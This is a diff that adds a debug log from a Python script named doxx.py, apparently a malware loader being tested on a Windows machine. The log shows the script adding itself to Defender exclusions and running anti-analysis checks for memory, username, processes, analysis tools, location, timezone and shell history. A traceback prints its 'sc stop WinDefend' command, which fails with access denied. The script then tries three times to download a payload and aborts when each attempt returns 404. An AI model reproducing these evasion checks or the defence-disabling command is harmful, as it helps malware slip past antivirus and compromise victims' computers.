@@ -1,0 +1,75 @@
+2026-07-11 17:50:47,028|INFO|[MAIN] start, PID=11848, sleeping 60 seconds to avoid startup noise
+2026-07-11 17:51:47,029|INFO|[MAIN] woke up, args=['C:\\Users\\hotlo\\OneDrive\\Desktop\\doxx.py']
+2026-07-11 17:51:47,030|INFO|[EXCLUSION] adding script to Defender exclusions
+2026-07-11 17:51:49,914|INFO|[EXCLUSION] done
+2026-07-11 17:51:49,914|INFO|[RAM_CHECK] start
+2026-07-11 17:51:49,915|DEBUG|[RAM_CHECK] total=7.72 GB
+2026-07-11 17:51:49,915|INFO|[RAM_CHECK] pass
+2026-07-11 17:51:49,916|INFO|[USER_CHECK] start
+2026-07-11 17:51:49,918|DEBUG|[USER_CHECK] username=hotlo
+2026-07-11 17:51:49,918|INFO|[USER_CHECK] pass
+2026-07-11 17:51:49,918|INFO|[PROC_CHECK] start
+2026-07-11 17:51:50,296|INFO|[PROC_CHECK] pass
+2026-07-11 17:51:50,296|INFO|[SW_CHECK] start
+2026-07-11 17:51:50,299|CRITICAL|[SW_CHECK] Tool: resource hacker version 5.2.8
+2026-07-11 17:51:50,299|WARNING|TESTING: Would have exited – Tool: resource hacker version 5.2.8
+2026-07-11 17:51:50,300|DEBUG|[SW_CHECK] total keys enumerated: 43
+2026-07-11 17:51:50,301|INFO|[SW_CHECK] pass
+2026-07-11 17:51:50,301|INFO|[GEO_CHECK] start
+2026-07-11 17:51:50,301|DEBUG|[GEO_CHECK] GeoID=39
+2026-07-11 17:51:50,301|INFO|[GEO_CHECK] pass via GeoID
+2026-07-11 17:51:50,301|INFO|[TZ_CHECK] start
+2026-07-11 17:51:50,302|DEBUG|[TZ_CHECK] timezone: Eastern Standard Time
+2026-07-11 17:51:50,302|INFO|[TZ_CHECK] pass
+2026-07-11 17:51:50,302|INFO|[PS_CHECK] start
+2026-07-11 17:51:50,303|INFO|[PS_CHECK] no history file
+2026-07-11 17:51:50,303|INFO|[HISTORY_CHECK] start
+2026-07-11 17:51:50,375|DEBUG|[HISTORY_CHECK] total=12054
+2026-07-11 17:51:50,376|INFO|[HISTORY_CHECK] end
+2026-07-11 17:51:50,376|INFO|[MAIN] all checks passed – environment legitimate
+2026-07-11 17:51:50,383|INFO|[DEFENDER_DISABLE] start
+2026-07-11 17:52:00,729|ERROR|[DEFENDER_DISABLE] failed: [WinError 5] Access is denied
+Traceback (most recent call last):
+  File "C:\Users\hotlo\OneDrive\Desktop\doxx.py", line 511, in disable_defender_cloud
+    subprocess.run('sc stop WinDefend', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.13_3.13.3824.0_x64__qbz5n2kfra8p0\Lib\subprocess.py", line 554, in run
+    with Popen(*popenargs, **kwargs) as process:
+         ~~~~~^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.13_3.13.3824.0_x64__qbz5n2kfra8p0\Lib\subprocess.py", line 1039, in __init__
+    self._execute_child(args, executable, preexec_fn, close_fds,
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                        pass_fds, cwd, env,
+                        ^^^^^^^^^^^^^^^^^^^
+    ...<5 lines>...
+                        gid, gids, uid, umask,
+                        ^^^^^^^^^^^^^^^^^^^^^^
+                        start_new_session, process_group)
+                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.13_3.13.3824.0_x64__qbz5n2kfra8p0\Lib\subprocess.py", line 1554, in _execute_child
+    hp, ht, pid, tid = _winapi.CreateProcess(executable, args,
+                       ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^
+                             # no special security
+                             ^^^^^^^^^^^^^^^^^^^^^
+    ...<4 lines>...
+                             cwd,
+                             ^^^^
+                             startupinfo)
+                             ^^^^^^^^^^^^
+PermissionError: [WinError 5] Access is denied
+2026-07-11 17:52:00,753|INFO|[WIN_UPDATE_DISABLE] start
+2026-07-11 17:52:00,753|INFO|[WIN_UPDATE_DISABLE] already disabled via policy
+2026-07-11 17:52:00,910|INFO|[DOWNLOAD] start
+2026-07-11 17:52:00,910|DEBUG|[DOWNLOAD] attempt 1/3
+2026-07-11 17:52:01,091|ERROR|[DOWNLOAD] File not found (404). Check filename and branch.
+2026-07-11 17:52:03,092|DEBUG|[DOWNLOAD] attempt 2/3
+2026-07-11 17:52:04,225|ERROR|[DOWNLOAD] File not found (404). Check filename and branch.
+2026-07-11 17:52:06,226|DEBUG|[DOWNLOAD] attempt 3/3
+2026-07-11 17:52:06,342|ERROR|[DOWNLOAD] File not found (404). Check filename and branch.
+2026-07-11 17:52:06,343|CRITICAL|[PAYLOAD] preparation failed, aborting
+2026-07-11 17:52:06,343|INFO|[ENV] Admin: True
+2026-07-11 17:52:06,343|INFO|[ENV] Country (GeoID): Canada
+2026-07-11 17:52:06,343|CRITICAL|TRIGGER_EXIT|code=999|reason=Payload preparation failed
+2026-07-11 17:52:06,343|INFO|Press Enter to exit...
+
+>>> Script will exit now. Press Enter to close this window.
